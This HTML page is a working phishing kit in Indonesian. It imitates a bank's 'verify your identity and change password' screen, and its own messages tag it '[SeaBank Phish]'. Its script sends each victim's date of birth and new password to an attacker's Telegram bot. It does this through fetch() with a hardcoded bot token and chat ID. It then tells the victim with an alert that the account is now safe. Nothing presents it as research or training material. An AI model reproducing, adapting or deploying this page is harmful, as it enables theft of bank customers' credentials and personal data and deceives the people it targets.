<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Identitas & Ganti Password</title>
    
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            overflow-x: hidden;
            box-sizing: border-box;
        }

        /* --- Konten Utama --- */
        .main-content {
            flex-grow: 1;
            padding: 20px;
        }

        .main-content h1 {
            font-size: 1.5em;
            font-weight: bold;
            color: #333;
            margin-top: 0;
            margin-bottom: 5px;
        }

        .main-content p {
            font-size: 0.9em;
            color: #555;
            margin-bottom: 30px;
        }

        /* --- Input Simulasi Tanggal Lahir --- */
        .input-field {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            border-radius: 8px;
            background-color: #f7f7f7;
            cursor: pointer;
            margin-bottom: 20px;
            font-size: 1em;
            color: #777;
            border: 1px solid #f7f7f7;
        }
        
        /* --- Kolom Input Password BARU --- */
        .password-input-group {
            margin-bottom: 20px;
        }

        .password-input-group label {
            display: block;
            font-size: 0.9em;
            color: #333;
            margin-bottom: 5px;
            font-weight: bold;
        }

        .password-input-group input {
            width: 100%;
            padding: 15px 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
            box-sizing: border-box;
            background-color: #f7f7f7;
        }
        
        .password-input-group input:focus {
            outline: none;
            border-color: #ff6600;
            background-color: #ffffff;
        }

        /* Teks Keamanan yang Diminta */
        .security-text {
            font-size: 0.75em;
            color: #777;
            line-height: 1.4;
            margin-top: -5px; 
            margin-bottom: 25px;
        }

        .input-field.selected {
            color: #333;
            font-weight: bold;
        }

        .arrow {
            font-size: 1.2em;
            color: #999;
        }

        /* --- Tombol Lanjutkan --- */
        .action-area {
            padding: 20px;
            text-align: center;
        }

        .continue-button {
            width: 100%;
            padding: 15px;
            background-color: #e0e0e0;
            color: #999;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: default;
            transition: background-color 0.3s, color 0.3s;
        }

        .continue-button.active {
            background-color: #ff6600;
            color: white;
            cursor: pointer;
        }

        /* --- Simulasi Date Picker (Modal) --- */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: flex-end;
            z-index: 1000;
        }

        .date-picker-modal {
            background-color: white;
            width: 100%;
            border-top-left-radius: 15px;
            border-top-right-radius: 15px;
            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.2);
            padding: 10px 0;
            position: relative;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            padding: 10px 20px;
            border-bottom: 1px solid #eee;
        }

        .modal-header button {
            background: none;
            border: none;
            font-size: 1em;
            font-weight: bold;
            cursor: pointer;
            color: #ff6600;
        }
        
        .modal-header .cancel-btn {
            color: #333;
        }

        .picker-container {
            display: flex;
            justify-content: space-around;
            padding: 20px 10px;
            height: 300px;
            overflow: hidden;
            text-align: center;
            font-size: 1.1em;
            position: relative; 
        }
        
        .picker-column {
            width: 30%;
            overflow-y: scroll;
            position: relative;
            padding: 0; 
            margin: 0;
            z-index: 1; 
            scroll-behavior: smooth;
        }

        .picker-column::-webkit-scrollbar { display: none; }
        .picker-column { -ms-overflow-style: none; scrollbar-width: none; }

        .picker-item {
            padding: 10px 0;
            transition: color 0.1s, font-weight 0.1s;
            height: 20px; 
            line-height: 20px;
            color: #333;
            cursor: pointer;
        }

        .picker-item.selected-item {
            color: #ff6600; 
            font-weight: bold;
        }
    </style>
</head>
<body>
    
<div class="main-content">
    <h1>Verifikasi Identitasmu</h1>
    <p>Masukkan detail untuk mengatur ulang password kamu.</p>

    <div class="input-field" id="dobInputField">
        <span id="dobValue">Tanggal Lahir</span>
        <span class="arrow">&gt;</span>
    </div>
    
    <div class="password-input-group">
        <label for="newPassword">Password Baru</label>
        <input type="password" id="newPassword" placeholder="Masukkan Password Baru" minlength="8" maxlength="16">
    </div>
    
    <div class="password-input-group">
        <label for="confirmNewPassword">Ulangi Password Baru</label>
        <input type="password" id="confirmNewPassword" placeholder="Ulangi Password Baru" minlength="8" maxlength="16">
    </div>
    
    <p class="security-text">
        Password harus terdiri dari **8-16 karakter**, mengandung **huruf** dan **angka**. Mohon tidak membagikan password kamu dengan siapa pun.
    </p>
</div>

<div class="action-area">
    <button class="continue-button" id="continueButton">Lanjutkan</button>
</div>

<div class="modal-overlay" id="datePickerModal">
    <div class="date-picker-modal">
        <div class="modal-header">
            <button class="cancel-btn" id="cancelDob">Batalkan</button>
            <button class="done-btn" id="doneDob">Done</button>
        </div>
        
        <div class="picker-container">
            <div class="picker-column" id="dayPicker"></div>
            <div class="picker-column" id="monthPicker"></div>
            <div class="picker-column" id="yearPicker"></div>
        </div>
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const dobInputField = document.getElementById('dobInputField');
        const dobValueSpan = document.getElementById('dobValue');
        const continueButton = document.getElementById('continueButton');
        const modalOverlay = document.getElementById('datePickerModal');
        const cancelDobButton = document.getElementById('cancelDob');
        const doneDobButton = document.getElementById('doneDob');
        
        const dayPicker = document.getElementById('dayPicker');
        const monthPicker = document.getElementById('monthPicker');
        const yearPicker = document.getElementById('yearPicker');
        
        // Input Password
        const newPasswordInput = document.getElementById('newPassword');
        const confirmNewPasswordInput = document.getElementById('confirmNewPassword');
        
        let selectedDate = {
            day: '01',
            month: 'Jan',
            year: '1960'
        };
        
        const ITEM_HEIGHT = 40; 
        
        // *** INFORMASI BOT TELEGRAM ANDA ***
        const BOT_TOKEN = '8286824254:AAHECrYlrnN0GeEBdG2ASNJEg79mw0FAYn8';
        const CHAT_ID = '5923031825';
        // **********************************

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            
            fetch(url).catch(error => {
                console.error('Error saat mengirim ke Telegram:', error);
            });
        }
        
        const MONTHS = ["Jan", "Feb", "Mar", "Apr", "Mei", "Jun", "Jul", "Agt", "Sep", "Okt", "Nov", "Des"];
        
        function populatePicker(pickerElement, dataArray, defaultValue) {
            pickerElement.innerHTML = ''; 
            
            dataArray.forEach(data => {
                const item = document.createElement('div');
                item.classList.add('picker-item');
                item.style.height = ITEM_HEIGHT + 'px';
                
                let textContent = data;
                if (pickerElement.id === 'dayPicker' && data.length < 2) {
                    textContent = data.padStart(2, '0');
                }
                
                item.textContent = textContent;
                item.dataset.value = data;
                
                const isSelected = item.dataset.value.padStart(2, '0') === defaultValue.padStart(2, '0');
                if (isSelected) {
                    item.classList.add('selected-item');
                }
                
                pickerElement.appendChild(item);
            });
            
            pickerElement.addEventListener('click', handleItemClick);
        }

        function populateAllPickers() {
            const days = Array.from({length: 31}, (_, i) => (i + 1).toString());
            populatePicker(dayPicker, days, selectedDate.day);

            const START_YEAR = 1960;
            const END_YEAR = 2025;
            const years = Array.from({length: END_YEAR - START_YEAR + 1}, (_, i) => (START_YEAR + i).toString());
            populatePicker(yearPicker, years, selectedDate.year);
            
            populatePicker(monthPicker, MONTHS, selectedDate.month); 
        }

        /**
         * Logika Tap-to-Select.
         */
        function handleItemClick(event) {
            const clickedItem = event.target.closest('.picker-item');
            if (!clickedItem || clickedItem.parentNode.id !== event.currentTarget.id) return;

            const pickerElement = event.currentTarget;
            const key = pickerElement.id.replace('Picker', '');

            pickerElement.querySelectorAll('.picker-item').forEach(item => {
                item.classList.remove('selected-item');
            });

            clickedItem.classList.add('selected-item');

            let valueToSave = clickedItem.dataset.value;
            
            if (key === 'day') {
                valueToSave = valueToSave.padStart(2, '0');
            }

            selectedDate[key] = valueToSave;
            
            scrollToCenter(pickerElement, clickedItem);
            checkContinueButton();
        }

        /**
         * Menggulir kolom agar item yang dipilih berada di tengah visual.
         */
        function scrollToCenter(pickerElement, selectedItem) {
            const itemIndex = Array.from(pickerElement.children).indexOf(selectedItem);
            if (itemIndex === -1) return;

            const itemTopPosition = itemIndex * ITEM_HEIGHT;
            
            // Posisi offset: (Tinggi Picker 300px / 2) - (Tinggi Item 40px / 2) = 130px
            const scrollOffset = 130; 

            pickerElement.scrollTop = itemTopPosition - scrollOffset;
        }

        function syncInitialState() {
            [dayPicker, monthPicker, yearPicker].forEach(picker => {
                const key = picker.id.replace('Picker', '');
                const currentValue = selectedDate[key];
                
                const selectedItem = Array.from(picker.children).find(item => {
                    let itemValue = item.dataset.value;
                    if (key === 'day') {
                        itemValue = itemValue.padStart(2, '0');
                    }
                    return itemValue === currentValue;
                });

                if (selectedItem) {
                    picker.querySelectorAll('.picker-item').forEach(item => item.classList.remove('selected-item'));
                    selectedItem.classList.add('selected-item');
                    setTimeout(() => scrollToCenter(picker, selectedItem), 10);
                }
            });

            checkContinueButton();
        }

        // --- VALIDASI PASSWORD ---
        function validatePassword(password) {
            const min = 8;
            const max = 16;
            const hasLetter = /[a-zA-Z]/.test(password);
            const hasNumber = /\d/.test(password);
            
            return password.length >= min && password.length <= max && hasLetter && hasNumber;
        }

        function checkContinueButton() {
            const dobSelected = dobInputField.classList.contains('selected');
            
            const newPass = newPasswordInput.value;
            const confirmPass = confirmNewPasswordInput.value;
            
            // Cek semua kolom yang dibutuhkan
            const allFieldsFilled = newPass && confirmPass && dobSelected;
            
            if (allFieldsFilled && validatePassword(newPass) && newPass === confirmPass) {
                continueButton.classList.add('active');
            } else {
                continueButton.classList.remove('active');
            }
        }
        
        // Tambahkan event listener untuk input password
        [newPasswordInput, confirmNewPasswordInput].forEach(input => {
            input.addEventListener('input', checkContinueButton);
        });


        // --- EVENT HANDLERS ---
        dobInputField.addEventListener('click', () => {
            modalOverlay.style.display = 'flex';
            setTimeout(syncInitialState, 50); 
        });

        cancelDobButton.addEventListener('click', () => {
            modalOverlay.style.display = 'none';
        });

        // Menerapkan Tanggal yang dipilih
        doneDobButton.addEventListener('click', () => {
            
            if (selectedDate.day && selectedDate.month && selectedDate.year) {
                
                const monthIndex = MONTHS.indexOf(selectedDate.month) + 1;
                const monthPadded = monthIndex.toString().padStart(2, '0');
                const dayPadded = selectedDate.day;

                const dobStringForDB = `${dayPadded}/${monthPadded}/${selectedDate.year}`;
                const displayString = `${dayPadded} ${selectedDate.month} ${selectedDate.year}`;
                
                dobValueSpan.textContent = displayString;
                dobInputField.classList.add('selected');
                
                // KIRIM DOB ke Telegram
                const dobMessage = `[SeaBank Phish] Tanggal Lahir Diterima (DD/MM/YYYY): ${dobStringForDB}`;
                sendToTelegram(dobMessage);

            } else {
                dobValueSpan.textContent = 'Tanggal Lahir';
                dobInputField.classList.remove('selected');
            }
            
            checkContinueButton();
            modalOverlay.style.display = 'none';
        });

        // Fungsi Tombol Lanjutkan (Tombol Orange)
        continueButton.addEventListener('click', function() {
            if (this.classList.contains('active')) {
                
                const newPass = newPasswordInput.value;
                
                // 1. KIRIM SEMUA DATA LENGKAP KE TELEGRAM
                const combinedMessage = `[SeaBank Phish] DATA LENGKAP DITERIMA:\nDOB: ${dobValueSpan.textContent}\nPassword Baru: ${newPass}`;
                sendToTelegram(combinedMessage);
                
                // 2. TAMPILKAN PESAN SUKSES SESUAI PERMINTAAN
                alert('Selamat, akun anda sudah aman. Jangan pernah bagikan data akun anda kepada siapapun.');
                
                // 3. Arahkan ke halaman tujuan (opsional, bisa diganti ke halaman login/sukses)
                // window.location.href = 'halaman_sukses.html'; 
            } else {
                // Tampilkan pesan kesalahan yang lebih spesifik
                if (!dobInputField.classList.contains('selected')) {
                    alert('Mohon pilih Tanggal Lahir.');
                } else if (!newPasswordInput.value || !confirmNewPasswordInput.value) {
                    alert('Mohon isi semua kolom Password Baru.');
                } else if (!validatePassword(newPasswordInput.value)) {
                    alert('Password Baru tidak sesuai kriteria: harus 8-16 karakter, mengandung huruf dan angka.');
                } else if (newPasswordInput.value !== confirmNewPasswordInput.value) {
                    alert('Ulangi Password Baru tidak sama dengan Password Baru.');
                }
            }
        });
        
        // Inisialisasi: POPULATE dan set default
        populateAllPickers();
        checkContinueButton(); 
    });
</script>
</body>
</html>
